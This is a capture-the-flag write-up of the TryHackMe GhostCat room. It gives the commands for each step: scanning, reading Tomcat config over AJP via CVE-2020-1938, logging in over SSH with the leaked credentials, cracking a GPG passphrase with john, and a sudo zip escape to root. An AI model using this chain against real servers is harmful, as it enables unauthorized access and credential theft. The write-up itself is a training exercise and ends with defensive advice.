---
title: "TryHackMe: GhostCat — Writeup"
date: 2022-03-04 12:00:00 +0800
categories: [TryHackMe]
tags: [linux, ctf, lfi, tomcat, cve]
---

## Overview

**GhostCat** is an easy room focused on **CVE-2020-1938** — the GhostCat vulnerability in Apache Tomcat's AJP connector. It allows unauthenticated file read (LFI) from anywhere on the server, including WEB-INF config files that may contain credentials.

---

## Recon

```bash
nmap -sC -sV -p- 10.10.x.x
```

```
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp  open  http    Apache Tomcat 9.0.30
```

Port **8009** — AJP connector. Tomcat 9.0.30. Known vulnerable to GhostCat.

---

## Exploitation — File Read via AJP

Using the public PoC for CVE-2020-1938:

```bash
python3 ghostcat.py -H 10.10.x.x -p 8009 -f /WEB-INF/web.xml
```

The XML response leaks a **username and password** stored in the welcome servlet config.

---

## SSH Access

```bash
ssh skyfuck@10.10.x.x
# enter leaked password
```

User flag retrieved from `/home/skyfuck/user.txt`.

---

## Privilege Escalation

Home directory contains two files: `credential.pgp` and `tryhackme.asc`.

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

GPG passphrase needed — crack it with `john`:

```bash
gpg2john tryhackme.asc > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase cracked → decrypt PGP → credentials for user `merlin` → `sudo -l` shows `(root) NOPASSWD: /usr/bin/zip` → GTFObins zip escape → **root**.

---

## Key Takeaway

AJP connectors should never be exposed publicly — firewall port 8009 or disable it entirely if unused. File reads via GhostCat can leak credentials even without direct code execution.
